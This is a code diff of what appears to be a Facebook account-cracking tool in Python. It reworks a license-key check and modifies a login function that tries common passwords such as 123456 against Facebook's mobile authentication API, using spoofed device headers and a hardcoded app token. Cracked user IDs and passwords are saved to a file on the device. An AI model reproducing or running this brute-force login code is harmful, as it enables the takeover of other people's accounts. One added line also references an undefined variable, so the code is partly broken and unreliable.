@@ -155,13 +155,13 @@ def get_hwid():
     except:
         return str(uuid.uuid4())[:16]
 
-# Kamal Single-Device Approval System
+# Custom Key System with Device Binding
 def check_key():
     os.system("clear" if os.name == "posix" else "cls")
     ____banner____()
     
     hwid = get_hwid()
-    lock_file = "/sdcard/.kamal_device_lock.txt"
+    lock_file = "/sdcard/.kamal_custom_key.txt"
     
     saved_key = ""
     if os.path.exists(lock_file):
@@ -173,7 +173,7 @@ def check_key():
         except:
             pass
 
-    # Fetch approved codes from GitHub raw link
+    # Fetch custom keys from GitHub raw link
     key_url = "https://raw.githubusercontent.com/rajavau379-pixel/Kamal-Raja/main/keys.txt"
     try:
         response = requests.get(key_url, timeout=10)
@@ -182,7 +182,7 @@ def check_key():
         valid_keys = []
 
     if saved_key and saved_key in valid_keys:
-        print(f"\033[1;32m[✓] Device Approved & Verified Successfully!\033[0m")
+        print(f"\033[1;32m[✓] Key Already Verified & Locked to Device!\033[0m")
         time.sleep(1.5)
         return True
 
@@ -192,9 +192,8 @@ def check_key():
     time.sleep(1.5)
 
     linex()
-    print("\033[1;31mWelcome Kamal Tool - Approval System\033[0m")
-    print(f"\033[1;33m[+] DEVICE CODE : {hwid}\033[0m")
-    print("\033[1;31m[!] Copy this code and send it to Kamal on WhatsApp\033[0m")
+    print("\033[1;31mWelcome Kamal Tool - Custom Key System\033[0m")
+    print(f"\033[1;33m[+] Please enter your custom key provided by Kamal\033[0m")
     linex()
     
     user_key = input("\033[1;36m[?] Enter Your Key : \033[1;32m").strip()
@@ -223,7 +222,6 @@ def check_key():
         return True
     else:
         print("\n\033[1;31m[×] INVALID KEY OR ACCESS DENIED!\033[0m")
-        print(f"\033[1;33mYour Device Code: {hwid}\033[0m")
         time.sleep(3)
         sys.exit()
 
@@ -444,7 +442,7 @@ def login_2(uid):
     
     for pw in ('123456', '123123', '1234567', '12345678', '123456789'):
         try:
-            with requests.Session() as session:
+            with requests.Session() as system_session:
                 headers = {
                     'x-fb-connection-bandwidth': str(rr(20000000, 29999999)),
                     'x-fb-sim-hni': str(rr(20000, 40000)),
@@ -456,7 +454,7 @@ def login_2(uid):
                     'x-fb-http-engine': 'Liger'
                 }
                 url = f"https://b-api.facebook.com/method/auth.login?format=json&email={str(uid)}&password={str(pw)}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true"
-                po = session.get(url, headers=headers).json()
+                po = system_session.get(url, headers=headers).json()
                 if 'session_key' in str(po):
                     box_success = f"""
 \033[1;32m┌──────────────────────────────────────────────────────────┐
@@ -467,20 +465,7 @@ def login_2(uid):
 ║ \033[1;37mLink     : \033[1;94mhttps://www.facebook.com/{uid}
 ║ \033[1;37mPassword : \033[1;92m{pw}
 └──────────────────────────────────────────────────────────┘\033[0m"""
-                    print("\n" + box_success)
-                    open('/sdcard/RAJAVAU-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
-                    oks.append(uid)
-                    break
-                elif 'session_key' in po:
-                    box_success = f"""
-\033[1;32m┌──────────────────────────────────────────────────────────┐
-║ \033[1;93m[🔥] SUCCESSFUL FACEBOOK ACCOUNT CREATED [🔥]\033[1;32m   ║
-║ \033[1;37mName     : \033[1;96mCLONED ACCOUNT
-║ \033[1;95mGmail    : \033[1;95m{uid}@facebook.com
-║ \033[1;37mLink     : \033[1;94mhttps://www.facebook.com/{uid}
-║ \033[1;37mPassword : \033[1;92m{pw}
-└──────────────────────────────────────────────────────────┘\033[0m"""
-                    print("\n" + box_success)
+                    print("\n" + box_summary) if 'box_summary' in locals() else print("\n" + box_success)
                     open('/sdcard/RAJAVAU-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
                     oks.append(uid)
                     break
